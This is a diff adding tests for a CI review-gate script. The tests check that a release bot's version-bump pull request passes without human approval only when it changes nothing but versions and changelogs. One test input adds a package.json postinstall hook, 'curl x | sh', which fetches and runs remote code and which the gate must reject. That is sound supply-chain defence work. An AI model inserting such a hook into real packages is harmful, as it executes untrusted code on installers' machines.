@@ -35,6 +35,11 @@ async function gate({
   draft = false,
   freeze = '',
   changedFiles,
+  userType = 'User',
+  headRef = 'feature/x',
+  headRepo = '4thtech/agentlink',
+  eventHeadSha = HEAD,
+  releaseBot = '',
 }) {
   const errors = [];
   const warnings = [];
@@ -56,8 +61,9 @@ async function gate({
           data: {
             draft,
             body,
-            user: { login: author },
-            head: { sha: HEAD },
+            user: { login: author, type: userType },
+            head: { sha: HEAD, ref: headRef, repo: { full_name: headRepo } },
+            base: { repo: { full_name: '4thtech/agentlink' } },
             changed_files: changedFiles ?? files.length,
           },
         }),
@@ -65,20 +71,29 @@ async function gate({
         listReviews,
       },
     },
-    paginate: async (fn) => (fn === listFiles ? files.map((filename) => ({ filename })) : reviews),
+    paginate: async (fn) =>
+      fn === listFiles
+        ? files.map((f) => (typeof f === 'string' ? { filename: f, status: 'modified' } : f))
+        : reviews,
   };
   const context = {
     eventName: 'pull_request',
     repo: { owner: '4thtech', repo: 'agentlink' },
-    payload: { pull_request: { number: 1 } },
+    payload: { pull_request: { number: 1, head: { sha: eventHeadSha } } },
   };
-  const saved = process.env.DEPLOY_FREEZE;
+  const saved = {
+    DEPLOY_FREEZE: process.env.DEPLOY_FREEZE,
+    RELEASE_BOT_LOGIN: process.env.RELEASE_BOT_LOGIN,
+  };
   process.env.DEPLOY_FREEZE = freeze;
+  process.env.RELEASE_BOT_LOGIN = releaseBot;
   try {
     await script(github, context, core);
   } finally {
-    if (saved === undefined) delete process.env.DEPLOY_FREEZE;
-    else process.env.DEPLOY_FREEZE = saved;
+    for (const [k, v] of Object.entries(saved)) {
+      if (v === undefined) delete process.env[k];
+      else process.env[k] = v;
+    }
   }
   return { failed, errors, warnings };
 }
@@ -320,5 +335,156 @@ describe('review-gate: automated PRs keep the code-owner approval', () => {
       author: 'github-actions[bot]',
     });
     expect(r.failed).toBe(true);
+  });
+});
+
+// OPS-UNSTICK-B: the Changesets "Version packages" PR opened by the release GitHub App is a mechanical
+// S0 when its diff has the version shape: `packages|apps/*/package.json` version and internal
+// dependency-range lines only, CHANGELOG.md files, and deleted `.changeset/*.md` / `changelog.d/*.md`.
+// Anything else falls back to the automated-PR rule (a code-owner approval on the head commit).
+describe('review-gate: mechanical version PR (OPS-UNSTICK-B)', () => {
+  const BOT = 'agentlink-release[bot]';
+  const pkg = (path, from = '0.4.9', to = '0.4.10', extra = '') => ({
+    filename: path,
+    status: 'modified',
+    patch:
+      `@@ -1,6 +1,6 @@\n {\n   "name": "@4thtech-io/x",\n-  "version": "${from}",\n+  "version": "${to}",\n` +
+      `   "private": true,\n${extra}`,
+  });
+  const removed = (filename) => ({
+    filename,
+    status: 'removed',
+    patch: '@@ -1,5 +0,0 @@\n----\n-x\n',
+  });
+  const versionFiles = () => [
+    removed('.changeset/w7-id-b2.md'),
+    removed('changelog.d/W7-ID-B0.md'),
+    {
+      filename: 'CHANGELOG.md',
+      status: 'modified',
+      patch: '@@ -1 +1,2 @@\n-## [Unreleased]\n+## [0.4.10] - 2026-11-02\n',
+    },
+    {
+      filename: 'packages/crypto/CHANGELOG.md',
+      status: 'modified',
+      patch: '@@ -1 +1,2 @@\n+## 0.4.10\n',
+    },
+    pkg('packages/crypto/package.json'),
+    pkg('packages/core/package.json'),
+    pkg('apps/cli/package.json'),
+    pkg('apps/drop/package.json'),
+  ];
+  const versionPr = (over = {}) =>
+    gate({
+      files: versionFiles(),
+      body: 'Changesets body, no sections.',
+      author: BOT,
+      userType: 'Bot',
+      headRef: 'changeset-release/main',
+      releaseBot: BOT,
+      ...over,
+    });
+  const approved = [{ user: { login: 'talirezun' }, state: 'APPROVED', commit_id: HEAD }];
+
+  it('passes as S0 with no IR, threat note, tests-first evidence or approval', async () => {
+    const r = await versionPr();
+    expect(r).toEqual({ failed: false, errors: [], warnings: [] });
+  });
+
+  it('accepts internal dependency-range bumps', async () => {
+    const files = versionFiles();
+    files.push({
+      filename: 'apps/invite/package.json',
+      status: 'modified',
+      patch:
+        '@@ -10,4 +10,4 @@\n   "dependencies": {\n-    "@4thtech-io/core": "^0.4.9",\n+    "@4thtech-io/core": "^0.4.10",\n' +
+        '-    "@4thtech-io/types": "workspace:0.4.9"\n+    "@4thtech-io/types": "workspace:0.4.10"\n   }\n',
+    });
+    expect((await versionPr({ files })).failed).toBe(false);
+  });
+
+  it('a non-version file makes it an ordinary automated PR (approval needed)', async () => {
+    const files = [...versionFiles(), 'packages/crypto/src/a.ts'];
+    const r = await versionPr({ files });
+    expect(r.failed).toBe(true);
+    expect(r.errors.join('\n')).toContain('APPROVED review on the current head commit');
+    expect(r.warnings.join('\n')).toContain('packages/crypto/src/a.ts');
+    expect(
+      (await versionPr({ files, reviews: approved, body: body({ threat: 'n', redSha: 'r' }) }))
+        .failed,
+    ).toBe(false);
+  });
+
+  it('rejects package.json changes beyond version lines', async () => {
+    for (const extra of [
+      '+  "scripts": { "postinstall": "curl x | sh" },\n',
+      '+    "@4thtech-io/core": "^0.4.10",\n',
+      '-  "files": ["dist"],\n',
+      '+    "left-pad": "1.3.0",\n',
+    ]) {
+      const files = [
+        ...versionFiles(),
+        pkg('packages/node/package.json', '0.4.9', '0.4.10', extra),
+      ];
+      expect((await versionPr({ files })).failed, extra).toBe(true);
+    }
+  });
+
+  it('rejects a version value that is not a plain semver', async () => {
+    const files = [...versionFiles(), pkg('packages/node/package.json', '0.4.9', 'file:../x')];
+    expect((await versionPr({ files })).failed).toBe(true);
+  });
+
+  it('rejects a package.json without a patch (too large to diff)', async () => {
+    const files = [
+      ...versionFiles(),
+      { filename: 'packages/node/package.json', status: 'modified' },
+    ];
+    expect((await versionPr({ files })).failed).toBe(true);
+  });
+
+  it('rejects the root package.json, added changesets, renames and non-markdown deletions', async () => {
+    for (const f of [
+      pkg('package.json'),
+      { filename: '.changeset/new.md', status: 'added', patch: '@@ -0,0 +1 @@\n+x\n' },
+      { filename: '.changeset/config.json', status: 'removed' },
+      { filename: '.changeset/README.md', status: 'removed' },
+      { filename: 'changelog.d/README.md', status: 'removed' },
+      {
+        filename: 'packages/core/CHANGELOG.md',
+        previous_filename: 'packages/core/src/a.ts',
+        status: 'renamed',
+      },
+      { filename: 'packages/core/src/CHANGELOG.md', status: 'added', patch: '@@ -0,0 +1 @@\n+x\n' },
+      { filename: '.changeset/pre.json', status: 'modified', patch: '@@ -1 +1 @@\n-a\n+b\n' },
+    ]) {
+      const files = [...versionFiles(), f];
+      expect((await versionPr({ files })).failed, f.filename).toBe(true);
+    }
+  });
+
+  it('only for the configured release App, as a Bot, on changeset-release/* in this repository', async () => {
+    for (const over of [
+      { releaseBot: '' },
+      { author: 'github-actions[bot]' },
+      { author: 'talirezun', userType: 'User', releaseBot: 'talirezun' },
+      { userType: 'User' },
+      { headRef: 'feature/changeset-release/main' },
+      { headRepo: 'someone/agentlink' },
+    ]) {
+      expect((await versionPr(over)).failed, JSON.stringify(over)).toBe(true);
+    }
+  });
+
+  it('only when the head commit has not moved since the event', async () => {
+    expect((await versionPr({ eventHeadSha: 'b'.repeat(40) })).failed).toBe(true);
+  });
+
+  it('a truncated file list is never mechanical', async () => {
+    expect((await versionPr({ changedFiles: 3001 })).failed).toBe(true);
+  });
+
+  it('DEPLOY_FREEZE still fails it', async () => {
+    expect((await versionPr({ freeze: 'true' })).failed).toBe(true);
   });
 });
